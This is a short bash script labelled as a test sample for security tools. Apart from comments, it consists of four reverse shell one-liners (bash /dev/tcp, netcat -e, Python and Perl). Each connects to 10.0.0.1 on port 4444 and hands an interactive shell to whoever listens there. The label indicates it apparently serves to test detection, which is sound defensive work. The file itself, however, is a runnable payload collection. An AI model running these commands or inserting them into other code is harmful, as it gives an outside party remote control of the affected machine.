#!/bin/bash
# [TEST SAMPLE] Reverse Shell Script - FOR SECURITY TESTING ONLY
# Multiple reverse shell techniques commonly detected by security tools

# Bash reverse shell
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# Netcat reverse shell
nc -e /bin/bash 10.0.0.1 4444

# Python reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Perl reverse shell
perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
